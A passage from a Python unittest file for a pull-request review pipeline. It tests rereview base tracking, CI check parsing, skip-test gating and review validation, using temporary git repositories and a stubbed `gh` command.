                build_clean_full_review(verdict="🟢 Approve", alert_tag="[!TIP]", file_rel="src/calc.mjs", file_label="calc.mjs"),
                encoding="utf-8",
            )
            lint_stub = root / "yomiyasu_race_stub.py"
            lint_stub.write_text(
                "#!/usr/bin/env python3\n"
                "import json, subprocess, sys\n"
                "sys.dont_write_bytecode = True\n"
                f"subprocess.run([sys.executable, '-B', {run_checks_script!r}, '--session', {str(sdir_m11)!r}, '--allow-exec'], check=True, stdout=subprocess.DEVNULL)\n"
                "print(json.dumps({'issues': []}))\n",
                encoding="utf-8",
            )
            env_with_lint = {"YHARUTO_SESSION_ROOT": str(sess_root)}
            rc_v11, out_v11, _, _ = run_script(
                "validate_review_output.py",
                ["--session", str(sdir_m11), "--file", str(rev_m11), "--yomiyasu-lint", str(lint_stub)],
                env=env_with_lint,
            )
            self.assertEqual(rc_v11, 1, f"Stage 5 must abort when Stage 2 revokes concurrently: {out_v11}")
            self.assertFalse(out_v11["passed"])
            self.assertTrue(any("concurrently" in str(e).lower() for e in _as_list(out_v11["gate_errors"])))
            after_m11 = _lib.read_verified_gate_state(sdir_m11)
            self.assertIs(after_m11.get("skip_test_revoked"), True)
            self.assertIs(_as_dict(after_m11["stage5"])["validated"], False)
            self.assertFalse((sess_root / ".history").exists())
            rc_post, _, _, _ = run_script(
                "post_pending_review.py",
                ["--session", str(sdir_m11), "--repo", "org/repo", "--pr", "901", "--review-md", str(rev_m11), "--dry-run"],
                env=env,
            )
            self.assertEqual(rc_post, 2)
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir_m11)], env=env)[0], 0)

    def test_m12_discontinuous_explicit_since_preserves_saved_base_while_continuous_chain_advances(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sess_root = root / "sessions"
            repo = root / "repo"
            init_git_repo(repo)
            (repo / "src").mkdir()
            (repo / "tests").mkdir()
            (repo / "src" / "a.mjs").write_text("export const a = 1;\n", encoding="utf-8")
            (repo / "src" / "b.mjs").write_text("export const b = 1;\n", encoding="utf-8")
            (repo / "src" / "c.mjs").write_text("export const c = 1;\n", encoding="utf-8")
            (repo / "src" / "d.mjs").write_text("export const d = 1;\n", encoding="utf-8")
            (repo / "tests" / "all.test.mjs").write_text(
                "import test from 'node:test';\nimport assert from 'node:assert/strict';\ntest('ok', () => assert.equal(1, 1));\n",
                encoding="utf-8",
            )
            (repo / "package.json").write_text(
                json.dumps({"name": "hist-demo", "scripts": {"test": "node --test tests/all.test.mjs"}}),
                encoding="utf-8",
            )
            m1 = git_commit_all(repo, "base")

            run_git(repo, ["checkout", "-b", "pr-55"])
            (repo / "src" / "a.mjs").write_text("export const a = 2;\n", encoding="utf-8")
            c1 = git_commit_all(repo, "c1")
            (repo / "src" / "b.mjs").write_text("export const b = 2;\n", encoding="utf-8")
            c2 = git_commit_all(repo, "c2 unreviewed")
            (repo / "src" / "c.mjs").write_text("export const c = 2;\n", encoding="utf-8")
            c3 = git_commit_all(repo, "c3")
            (repo / "src" / "d.mjs").write_text("export const d = 2;\n", encoding="utf-8")
            c4 = git_commit_all(repo, "c4")

            env = {"YHARUTO_SESSION_ROOT": str(sess_root), "YOMIYASU_LINT_DISABLE": "1"}

            def run_pr_review(pr_num: int, head: str, extra: list[str], checked: list[str], rel: str, label: str) -> None:
                mpath = root / f"pr{pr_num}_{head[:8]}.json"
                mpath.write_text(json.dumps({"number": pr_num, "base_sha": m1, "head_sha": head}), encoding="utf-8")
                rc, prep, _, err = run_script(
                    "prepare_worktree.py",
                    ["prepare", "--repo", str(repo), "--pr", str(pr_num), "--pr-meta", str(mpath), *extra],
                    env=env,
                )
                self.assertEqual(rc, 0, err)
                sdir = Path(str(prep["session_dir"]))
                self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir)], env=env)[0], 0)
                self.assertEqual(
                    run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir), "--verdict", "OK", "--verified-tests", "tests/all.test.mjs"], env=env)[0],
                    0,
                )
                self.assertEqual(run_script("run_checks.py", ["--session", str(sdir)], env=env)[0], 0)
                rc_v, out_v = self._complete_stage3_to_5(
                    prep=prep, env=env, checked_files=checked, file_rel=rel, file_label=label
                )
                self.assertEqual(rc_v, 0, json.dumps(out_v, ensure_ascii=False))
                self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir)], env=env)[0], 0)

            # 1. Full initial review at c1 saves c1
            run_pr_review(55, c1, [], ["src/a.mjs"], "src/a.mjs", "a.mjs")

            # 2. Discontinuous explicit --since c2 at c3 skips c1..c2 -> must NOT overwrite saved base c1
            run_pr_review(55, c3, ["--since", c2], ["src/c.mjs"], "src/c.mjs", "c.mjs")

            # 3. Next automatic --rereview at c4 must start from c1 (including c2's src/b.mjs)
            meta_c4 = root / "pr55_c4.json"
            meta_c4.write_text(json.dumps({"number": 55, "base_sha": m1, "head_sha": c4}), encoding="utf-8")
            rc_auto, prep_auto, _, err_auto = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--pr", "55", "--pr-meta", str(meta_c4), "--rereview"],
                env=env,
            )
            self.assertEqual(rc_auto, 0, err_auto)
            self.assertEqual(prep_auto["review_base_sha"], c1)
            self.assertIn("src/b.mjs", _as_list(prep_auto["changed_files"]))
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(prep_auto["session_dir"])], env=env)[0], 0)

            # 4. Continuous chain A..C (--since c1 at c3) DOES advance saved base to c3
            run_pr_review(55, c3, ["--since", c1], ["src/b.mjs", "src/c.mjs"], "src/c.mjs", "c.mjs")
            rc_auto2, prep_auto2, _, err_auto2 = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--pr", "55", "--pr-meta", str(meta_c4), "--rereview"],
                env=env,
            )
            self.assertEqual(rc_auto2, 0, err_auto2)
            self.assertEqual(prep_auto2["review_base_sha"], c3)
            self.assertEqual(prep_auto2["changed_files"], ["src/d.mjs"])
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(prep_auto2["session_dir"])], env=env)[0], 0)

            # 5. PR #56 with no prior history running --since c2 must NOT create a history base at c3
            run_pr_review(56, c3, ["--since", c2], ["src/c.mjs"], "src/c.mjs", "c.mjs")
            cands56, exact56 = _lib.load_review_history_candidates(sess_root, "global", repo, 56)
            self.assertFalse(exact56)
            self.assertEqual(cands56, [])

    def test_m13_deletion_only_rereview_accepts_base_evidence_and_rejects_git_pointer(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sess_root = root / "sessions"
            repo = root / "repo"
            init_git_repo(repo)
            (repo / "src").mkdir()
            (repo / "src" / "only.py").write_text("def legacy() -> int:\n    return 1\n", encoding="utf-8")
            base_sha = git_commit_all(repo, "base with single file")

            run_git(repo, ["checkout", "-b", "delete-last"])
            (repo / "src" / "only.py").unlink()
            head_sha = git_commit_all(repo, "delete last file")

            env = {"YHARUTO_SESSION_ROOT": str(sess_root), "YOMIYASU_LINT_DISABLE": "1"}
            rc, prep, _, err = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--range", f"{base_sha}..{head_sha}", "--only-files", "src/only.py"],
                env=env,
            )
            self.assertEqual(rc, 0, err)
            sdir = Path(str(prep["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir)], env=env)[0], 0)
            self.assertEqual(
                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir), "--verdict", "EXEMPT"], env=env)[0],
                0,
            )
            self.assertEqual(run_script("run_checks.py", ["--session", str(sdir)], env=env)[0], 0)
            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env)[0], 0)
            draft = Path(str(prep["draft_findings_path"]))
            draft.write_text("[]\n", encoding="utf-8")
            self.assertEqual(
                run_script("prepare_worktree.py", ["prepare-stage4", "--session", str(sdir), "--draft", str(draft)], env=env)[0],
                0,
            )
            nonce = extract_challenge_nonce(Path(str(prep["adversarial_input_path"])))
            resp = Path(str(prep["adversarial_response_path"]))

            # .git pointer file must be rejected as Stage 4 evidence
            resp.write_text(
                json.dumps(
                    {
                        "challenge_nonce": nonce,
                        "challenged_findings": [],
                        "missed_findings": [],
                        "checked_files": [".git"],
                        "audit_notes": "メタデータファイル指定が拒否されることを確認します。",
                    },
                    ensure_ascii=False,
                ),
                encoding="utf-8",
            )
            self.assertEqual(
                run_script(
                    "prepare_worktree.py",
                    ["record-stage4", "--session", str(sdir), "--verifier-mode", "subagent", "--response-file", str(resp)],
                    env=env,
                )[0],
                2,
            )

            # Base-side deleted file src/only.py must be accepted in both Stage 4 and Stage 5
            resp.write_text(
                json.dumps(
                    {
                        "challenge_nonce": nonce,
                        "challenged_findings": [],
                        "missed_findings": [],
                        "checked_files": ["src/only.py"],
                        "audit_notes": "削除されたベース側ファイルの差分と影響範囲を確認しました。",
                    },
                    ensure_ascii=False,
                ),
                encoding="utf-8",
            )
            rc_r4, _, _, err_r4 = run_script(
                "prepare_worktree.py",
                ["record-stage4", "--session", str(sdir), "--verifier-mode", "subagent", "--response-file", str(resp)],
                env=env,
            )
            self.assertEqual(rc_r4, 0, err_r4)
            rev = Path(str(prep["review_output_path"]))
            rev.write_text(
                build_clean_full_review(verdict="🟢 Approve", alert_tag="[!TIP]", file_rel="src/only.py", file_label="only.py"),
                encoding="utf-8",
            )
            rc_v, out_v, _, _ = run_script(
                "validate_review_output.py",
                ["--session", str(sdir), "--file", str(rev)],
                env=env,
            )
            self.assertEqual(rc_v, 0, json.dumps(out_v, ensure_ascii=False))
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir)], env=env)[0], 0)

    def test_m14_go_failure_ids_include_package_path(self) -> None:
        wd = Path("/tmp/go-demo")
        base_out = (
            "--- FAIL: TestParse (0.00s)\n"
            "    a_test.go:8: fail\n"
            "FAIL\n"
            "FAIL\texample/a\t0.002s\n"
            "ok  \texample/b\t0.001s\n"
        )
        head_swap_out = (
            "ok  \texample/a\t0.001s\n"
            "--- FAIL: TestParse (0.00s)\n"
            "    b_test.go:9: fail\n"
            "FAIL\n"
            "FAIL\texample/b\t0.002s\n"
        )
        head_both_out = (
            "--- FAIL: TestParse (0.00s)\n"
            "FAIL\n"
            "FAIL\texample/a\t0.002s\n"
            "--- FAIL: TestParse (0.00s)\n"
            "FAIL\n"
            "FAIL\texample/b\t0.003s\n"
        )
        base_ids, base_cnt = run_checks.extract_failure_signature(base_out, wd)
        swap_ids, swap_cnt = run_checks.extract_failure_signature(head_swap_out, wd)
        both_ids, both_cnt = run_checks.extract_failure_signature(head_both_out, wd)

        self.assertEqual(base_ids, ["go:example/a:TestParse"])
        self.assertEqual(base_cnt, 1)
        self.assertEqual(swap_ids, ["go:example/b:TestParse"])
        self.assertEqual(swap_cnt, 1)
        self.assertEqual(both_ids, ["go:example/a:TestParse", "go:example/b:TestParse"])
        self.assertEqual(both_cnt, 2)

        is_reg_swap, new_swap = run_checks._compare_head_and_base_failures(
            {"failed_tests": swap_ids, "failure_count": swap_cnt},
            {"failed_tests": base_ids, "failure_count": base_cnt},
        )
        self.assertTrue(is_reg_swap)
        self.assertEqual(new_swap, ["go:example/b:TestParse"])

        is_reg_both, new_both = run_checks._compare_head_and_base_failures(
            {"failed_tests": both_ids, "failure_count": both_cnt},
            {"failed_tests": base_ids, "failure_count": base_cnt},
        )
        self.assertTrue(is_reg_both)
        self.assertEqual(new_both, ["go:example/b:TestParse"])

        if shutil.which("go") is not None:
            with tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                sess_root = root / "sessions"
                repo = root / "go_repo"
                init_git_repo(repo)
                (repo / "go.mod").write_text("module example\n\ngo 1.22\n", encoding="utf-8")
                (repo / "a").mkdir()
                (repo / "b").mkdir()
                (repo / "a" / "a_test.go").write_text(
                    'package a\nimport "testing"\nfunc TestParse(t *testing.T) { t.Fatal("preexisting") }\n',
                    encoding="utf-8",
                )
                (repo / "b" / "b_test.go").write_text(
                    'package b\nimport "testing"\nfunc TestParse(t *testing.T) {}\n',
                    encoding="utf-8",
                )
                git_commit_all(repo, "base a fails")
                run_git(repo, ["checkout", "-b", "pr-go"])
                (repo / "b" / "b_test.go").write_text(
                    'package b\nimport "testing"\nfunc TestParse(t *testing.T) { t.Fatal("new failure") }\n',
                    encoding="utf-8",
                )
                git_commit_all(repo, "head b also fails")
                env = {"YHARUTO_SESSION_ROOT": str(sess_root), "YOMIYASU_LINT_DISABLE": "1"}
                rc, prep, _, err = run_script(
                    "prepare_worktree.py",
                    ["prepare", "--repo", str(repo), "--range", "main..pr-go", "--skip-test"],
                    env=env,
                )
                self.assertEqual(rc, 0, err)
                sdir = Path(str(prep["session_dir"]))
                self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir)], env=env)[0], 0)
                self.assertEqual(
                    run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir), "--verdict", "SKIP", "--skip-test"], env=env)[0],
                    0,
                )
                rc_ci, out_ci, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env)
                self.assertEqual(rc_ci, 0)
                self.assertIs(out_ci.get("skip_test_revoked"), True)
                test_chk = next(c for c in _as_list(out_ci["checks"]) if isinstance(c, dict) and c.get("tool") == "test")
                self.assertEqual(test_chk["status"], "failed")
                self.assertIn("go:example/b:TestParse", _as_list(test_chk.get("new_failed_tests", [])))
                self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir)], env=env)[0], 0)

    def test_m15_live_gh_pr_checks_job_named_authentication_not_env_unavailable(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sess_root = root / "sessions"
            repo = root / "repo"
            init_git_repo(repo)
            (repo / "src").mkdir()
            (repo / "src" / "app.mjs").write_text("export const a = 1;\n", encoding="utf-8")
            base_sha = git_commit_all(repo, "base")
            run_git(repo, ["checkout", "-b", "pr-auth"])
            (repo / "src" / "app.mjs").write_text("export const a = 2;\n", encoding="utf-8")
            head_sha = git_commit_all(repo, "head")

            stub_bin = root / "gh_bin"
            stub_bin.mkdir()
            view_json = stub_bin / "view1501.json"
            view_json.write_text(
                json.dumps(
                    {
                        "number": 1501,
                        "title": "PR 1501",
                        "body": "",
                        "baseRefName": "main",
                        "baseRefOid": base_sha,
                        "headRefName": "pr-auth",
                        "headRefOid": head_sha,
                        "isCrossRepository": True,
                        "statusCheckRollup": [],
                    }
                ),
                encoding="utf-8",
            )
            gh_stub = stub_bin / "gh"
            gh_stub.write_text(
                "#!/usr/bin/env python3\n"
                "import pathlib, sys\n"
                "sys.dont_write_bytecode = True\n"
                "args = sys.argv[1:]\n"
                "if args[:2] == ['pr', 'view']:\n"
                f"    sys.stdout.write(pathlib.Path({str(view_json)!r}).read_text(encoding='utf-8'))\n"
                "    sys.exit(0)\n"
                "if args[:2] == ['pr', 'checks']:\n"
                "    sys.stdout.write('authentication\\tpass\\t1s\\thttps://example.com/1\\n')\n"
                "    sys.stdout.write('unit-tests\\tfail\\t3s\\thttps://example.com/2\\n')\n"
                "    sys.exit(1)\n"
                "sys.exit(1)\n",
                encoding="utf-8",
            )
            gh_stub.chmod(gh_stub.stat().st_mode | stat.S_IXUSR)

            env_live = {
                "YHARUTO_SESSION_ROOT": str(sess_root),
                "YOMIYASU_LINT_DISABLE": "1",
                "PATH": f"{stub_bin}{os.pathsep}{os.environ.get('PATH', '')}",
            }
            rc, prep, _, err = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--pr", "1501", "--skip-test"],
                env=env_live,
            )
            self.assertEqual(rc, 0, err)
            sdir = Path(str(prep["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir)], env=env_live)[0], 0)
            self.assertEqual(
                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir), "--verdict", "NG", "--gaps-count", "1", "--summary", "gap"], env=env_live)[0],
                0,
            )
            rc_ci, out_ci, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env_live)
            self.assertEqual(rc_ci, 0)
            gh_chk = next(c for c in _as_list(out_ci["checks"]) if isinstance(c, dict) and c.get("tool") == "gh_pr_checks")
            self.assertEqual(gh_chk["status"], "failed")
            self.assertEqual(gh_chk.get("failed_checks"), ["unit-tests"])
            self.assertIs(out_ci.get("skip_test_revoked"), True)
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir)], env=env_live)[0], 0)

    def test_audit_b1_b2_and_skip_test_confirmation_hardening(self) -> None:
        # B1: OS runner matrix tokens (ubuntu-latest / macos-latest / windows-latest) & Build workflow
        # must NOT disqualify generic test jobs from revoking --skip-test.
        for name, workflow in (
            ("CI / Python 3.12 (ubuntu-latest)", "CI"),
            ("Python 3.12 (ubuntu-latest)", "CI"),
            ("Node 22 (macos-latest)", "CI"),
            ("windows-latest", "CI"),
            ("Python 3.12", "Build"),
            ("pytest --cov coverage", "CI"),
        ):
            self.assertTrue(
                _lib.is_potential_test_check(name, workflow),
                f"Expected potential test check: workflow={workflow!r}, name={name!r}",
            )
        for non_test_name in ("check-latest", "build-attestation", "contest-lint", "eslint", "Vercel"):
            self.assertFalse(
                _lib.is_potential_test_check(non_test_name, ""),
                f"Expected non-test check: {non_test_name!r}",
            )

        # Minor m1/m2: status token parser rejects arbitrary sentences and classifies CANCELED/FAIL as failed
        self.assertEqual(_lib.parse_gh_pr_check_rows(["Error: authentication failed"], tsv_only=True), [])
        self.assertEqual(_lib.parse_gh_pr_check_rows(["Error: authentication failed"]), [])
        self.assertEqual(_lib.parse_gh_pr_check_rows(["Warning: pass --repo owner/repo"]), [])
        self.assertEqual(run_checks._classify_rollup_entry({"name": "unit-tests", "conclusion": "CANCELED"})[0], "failed")
        self.assertEqual(run_checks._classify_rollup_entry({"name": "unit-tests", "state": "FAIL"})[0], "failed")

        # R1 M1 & M2: evaluate_skip_test_stage2_status fail-closed confirmation rules
        base_skip_state: dict[str, object] = {
            "skip_test": True,
            "skip_test_revoked": False,
            "stage1": {"status": "NG", "bypassed_by_skip_test": True},
        }
        # Generic Vercel or authentication passing alone cannot confirm tests
        st_vercel, _ = _lib.evaluate_skip_test_stage2_status(
            {
                **base_skip_state,
                "stage2": {
                    "executed": True,
                    "checks": [
                        {"tool": "test", "status": "blocked_fork"},
                        {
                            "tool": "gh_pr_checks",
                            "status": "passed",
                            "check_entries": [
                                {"name": "Vercel", "workflow": "", "status": "passed"},
                                {"name": "authentication", "workflow": "", "status": "passed"},
                                {"name": "unit-tests", "workflow": "CI", "status": "neutral"},
                            ],
                        },
                    ],
                },
            }
        )
        self.assertEqual(st_vercel, "unverified")

        # Empty gh_pr_checks with status='passed' cannot confirm tests
        st_empty_gh, _ = _lib.evaluate_skip_test_stage2_status(
            {
                **base_skip_state,
                "stage2": {
                    "executed": True,
                    "checks": [{"tool": "gh_pr_checks", "status": "passed"}],
                },
            }
        )
        self.assertEqual(st_empty_gh, "unverified")

        # Local pass + remote pending test -> MUST hold as pending (not confirmed)
        st_local_plus_pending, _ = _lib.evaluate_skip_test_stage2_status(
            {
                **base_skip_state,
                "stage2": {
                    "executed": True,
                    "checks": [
                        {"tool": "test", "status": "passed"},
                        {
                            "tool": "gh_pr_checks",
                            "status": "pending",
                            "check_entries": [{"name": "e2e-tests", "workflow": "CI", "status": "pending"}],
                        },
                    ],
                },
            }
        )
        self.assertEqual(st_local_plus_pending, "pending")

        # Polyglot repo: Node passed + Python env_unavailable -> MUST hold as unverified
        st_polyglot, _ = _lib.evaluate_skip_test_stage2_status(
            {
                **base_skip_state,
                "stage2": {
                    "executed": True,
                    "checks": [
                        {"tool": "test", "status": "passed"},
                        {"tool": "python_test", "status": "env_unavailable"},
                    ],
                },
            }
        )
        self.assertEqual(st_polyglot, "unverified")

        # B2: Live --pr session prepared while IN_PROGRESS must refresh via live `gh pr checks` on Stage 2 re-run
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sess_root = root / "sessions"
            repo = root / "repo_live_refresh"
            init_git_repo(repo)
            (repo / "src").mkdir()
            (repo / "src" / "app.py").write_text("def run() -> int:\n    return 1\n", encoding="utf-8")
            base_sha = git_commit_all(repo, "base")
            run_git(repo, ["checkout", "-b", "pr-b2"])
            (repo / "src" / "app.py").write_text("def run() -> int:\n    return 2\n", encoding="utf-8")
            head_sha = git_commit_all(repo, "head")

            stub_bin = root / "gh_bin"
            stub_bin.mkdir()
            view_json = stub_bin / "view_b2.json"
            view_json.write_text(
                json.dumps(
                    {
                        "number": 2002,
                        "title": "PR 2002",
                        "body": "",
                        "baseRefName": "main",
                        "baseRefOid": base_sha,
                        "headRefName": "pr-b2",
                        "headRefOid": head_sha,
                        "isCrossRepository": True,
                        "statusCheckRollup": [
                            {"name": "unit-tests", "workflowName": "Tests", "status": "IN_PROGRESS", "conclusion": ""}
                        ],
                    }
                ),
                encoding="utf-8",
            )
            checks_state_file = stub_bin / "live_checks.json"
            checks_state_file.write_text(
                json.dumps(
                    {
                        "rc": 8,
                        "rows": [{"name": "unit-tests", "workflow": "Tests", "bucket": "pending", "state": "IN_PROGRESS"}],
                    }
                ),
                encoding="utf-8",
            )
            gh_stub = stub_bin / "gh"
            gh_stub.write_text(
                "#!/usr/bin/env python3\n"
                "import json, pathlib, sys\n"
                "sys.dont_write_bytecode = True\n"
                "args = sys.argv[1:]\n"
                "if args[:2] == ['pr', 'view']:\n"
                f"    sys.stdout.write(pathlib.Path({str(view_json)!r}).read_text(encoding='utf-8'))\n"
                "    sys.exit(0)\n"
                "if args[:2] == ['pr', 'checks']:\n"
                f"    data = json.loads(pathlib.Path({str(checks_state_file)!r}).read_text(encoding='utf-8'))\n"
                "    sys.stdout.write(json.dumps(data['rows']))\n"
                "    sys.exit(int(data['rc']))\n"
                "sys.exit(1)\n",
                encoding="utf-8",
            )
            gh_stub.chmod(gh_stub.stat().st_mode | stat.S_IXUSR)
            env_live = {
                "YHARUTO_SESSION_ROOT": str(sess_root),
                "YOMIYASU_LINT_DISABLE": "1",
                "PATH": f"{stub_bin}{os.pathsep}{os.environ.get('PATH', '')}",
            }

            rc_p, prep, _, err_p = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--pr", "2002", "--skip-test"],
                env=env_live,
            )
            self.assertEqual(rc_p, 0, err_p)
            sdir = Path(str(prep["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir)], env=env_live)[0], 0)
            self.assertEqual(
                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir), "--verdict", "NG", "--gaps-count", "1", "--summary", "gap"], env=env_live)[0],
                0,
            )

            # First Stage 2 run: live checks are still pending -> on hold (not revoked)
            rc1, ci1, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env_live)
            self.assertEqual(rc1, 0)
            self.assertIs(ci1.get("skip_test_on_hold"), True)
            self.assertEqual(ci1.get("skip_test_hold_status"), "pending")
            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env_live)[0], 2)

            # CI finishes passing on GitHub (gate_state.json untouched!) -> Stage 2 re-run refreshes live checks and unlocks Stage 3
            checks_state_file.write_text(
                json.dumps(
                    {
                        "rc": 0,
                        "rows": [{"name": "unit-tests", "workflow": "Tests", "bucket": "pass", "state": "SUCCESS"}],
                    }
                ),
                encoding="utf-8",
            )
            rc2, ci2, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env_live)
            self.assertEqual(rc2, 0)
            self.assertNotIn("skip_test_on_hold", ci2)
            self.assertNotIn("skip_test_revoked", ci2)
            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env_live)[0], 0)

            # Empty live JSON array [] with exit 0 must classify as not_configured (not passed)
            checks_state_file.write_text(json.dumps({"rc": 0, "rows": []}), encoding="utf-8")
            rc3, ci3, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env_live)
            self.assertEqual(rc3, 0)
            gh3 = next(c for c in _as_list(ci3["checks"]) if isinstance(c, dict) and c.get("tool") == "gh_pr_checks")
            self.assertEqual(gh3["status"], "not_configured")
            self.assertEqual(ci3.get("skip_test_hold_status"), "unverified")
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir)], env=env_live)[0], 0)

    def test_audit_r2_m1_m2_m8_m12_m14_and_m3_e2e_hardening(self) -> None:
        # M1: nested source modules named build/target/dist remain testable code files
        self.assertTrue(prepare_worktree.is_testable_code_file("src/build/compiler.py"))
        self.assertTrue(prepare_worktree.is_testable_code_file("pkg/target/resolver.go"))
        self.assertFalse(prepare_worktree.is_testable_code_file(".astro/types.d.ts"))

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            wd = root / "wd"
            wd.mkdir()

            # M14: Vitest space-delimited FAIL line must NOT generate Go <package_fail> ID
            vitest_base = " FAIL  tests/app.test.ts [ tests/app.test.ts ]\nError: Cannot find module './old'\n"
            vitest_head = " FAIL  tests/app.test.ts [ tests/app.test.ts ]\nSyntaxError: Unexpected token in './new'\n"
            v_base_ids, _ = run_checks.extract_failure_signature(vitest_base, wd)
            v_head_ids, _ = run_checks.extract_failure_signature(vitest_head, wd)
            self.assertFalse(any(fid.startswith("go:") for fid in v_base_ids))
            self.assertFalse(any(fid.startswith("go:") for fid in v_head_ids))

            # M14: Go [build failed] coarse package ID must NOT short-circuit diagnostic comparison
            go_base = "# example/d\nd/old.go:3:1: undefined: oldVar\nFAIL\texample/d [build failed]\n"
            go_head = "# example/d\nd/new.go:9:1: undefined: newVar\nFAIL\texample/d [build failed]\n"
            gb_ids, gb_cnt = run_checks.extract_failure_signature(go_base, wd)
            gh_ids, gh_cnt = run_checks.extract_failure_signature(go_head, wd)
            origin_go, _, _ = run_checks._classify_head_vs_base_failure(
                {
                    "failed_tests": gh_ids,
                    "failure_count": gh_cnt,
                    "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(go_head, wd),
                },
                {
                    "failed_tests": gb_ids,
                    "failure_count": gb_cnt,
                    "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(go_base, wd),
                },
            )
            self.assertEqual(origin_go, "regression")

            # M2: Multi-line rustc diagnostics at different files must be regression
            rust_base = "error[E0308]: mismatched types\n --> src/a.rs:3:5\n"
            rust_head = "error[E0308]: mismatched types\n --> src/b.rs:3:5\n"
            origin_rust, _, _ = run_checks._classify_head_vs_base_failure(
                {"failure_count": 1, "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(rust_head, wd)},
                {"failure_count": 1, "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(rust_base, wd)},
            )
            self.assertEqual(origin_rust, "regression")

            # M2: Multiplicity shift ({E0308 x1, E0425 x1} -> {E0308 x2}) must be regression
            origin_mult, _, _ = run_checks._classify_head_vs_base_failure(
                {
                    "failure_count": 2,
                    "_diagnostic_signatures": [
                        "error[E0308]: mismatched types @ --> src/a.rs:3:5",
                        "error[E0308]: mismatched types @ --> src/a.rs:3:5",
                    ],
                },
                {
                    "failure_count": 2,
                    "_diagnostic_signatures": [
                        "error[E0308]: mismatched types @ --> src/a.rs:3:5",
                        "error[E0425]: cannot find value @ --> src/b.rs:7:1",
                    ],
                },
            )
            self.assertEqual(origin_mult, "regression")

            # M2: ESLint stylish summary (`✖ 1 problem`) must NOT become a spec test ID masking file change
            eslint_base = f"{wd}/src/a.ts\n  3:5  error  Unexpected any  @typescript-eslint/no-explicit-any\n\n✖ 1 problem (1 error, 0 warnings)\n"
            eslint_head = f"{wd}/src/b.ts\n  9:1  error  Unexpected any  @typescript-eslint/no-explicit-any\n\n✖ 1 problem (1 error, 0 warnings)\n"
            eb_ids, eb_cnt = run_checks.extract_failure_signature(eslint_base, wd)
            eh_ids, eh_cnt = run_checks.extract_failure_signature(eslint_head, wd)
            self.assertEqual(eb_ids, [])
            self.assertEqual(eh_ids, [])
            origin_eslint, _, _ = run_checks._classify_head_vs_base_failure(
                {"failure_count": eh_cnt, "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(eslint_head, wd)},
                {"failure_count": eb_cnt, "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(eslint_base, wd)},
            )
            self.assertEqual(origin_eslint, "regression")

            # M2: >40-line output with identical 40-line footer but different top error must NOT be preexisting
            footer = [f"footer line {i}" for i in range(45)]
            long_base = "\n".join(["top failure in src/a.py", *footer])
            long_head = "\n".join(["top failure in src/b.py", *footer])
            origin_long, _, _ = run_checks._classify_head_vs_base_failure(
                {
                    "_normalized_summary_lines": footer[-40:],
                    "_normalized_output_sha256": _lib.sha256_bytes(long_head.encode("utf-8")),
                },
                {
                    "_normalized_summary_lines": footer[-40:],
                    "_normalized_output_sha256": _lib.sha256_bytes(long_base.encode("utf-8")),
                },
            )
            self.assertEqual(origin_long, "unknown")

            # M8: --local --since <other_branch> on unborn HEAD must be rejected (exit 2)
            sess_root = root / "sessions"
            env = {"YHARUTO_SESSION_ROOT": str(sess_root), "YOMIYASU_LINT_DISABLE": "1"}
            repo_unborn = root / "repo_unborn"
            init_git_repo(repo_unborn)
            (repo_unborn / "main.py").write_text("x = 1\n", encoding="utf-8")
            git_commit_all(repo_unborn, "main init")
            run_git(repo_unborn, ["checkout", "--orphan", "wip"])
            run_git(repo_unborn, ["rm", "-rf", "."])
            (repo_unborn / "new_file.py").write_text("y = 2\n", encoding="utf-8")
            rc_unborn, out_unborn, _, _ = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo_unborn), "--local", "--since", "main"],
                env=env,
            )
            self.assertEqual(rc_unborn, 2)
            self.assertIn("HEAD", str(out_unborn.get("error", "")))

            # M12: local mode --since HEAD, --rereview-source run_history, and corrupt runs.json must NOT advance history
            repo_loc = root / "repo_loc_hist"
            init_git_repo(repo_loc)
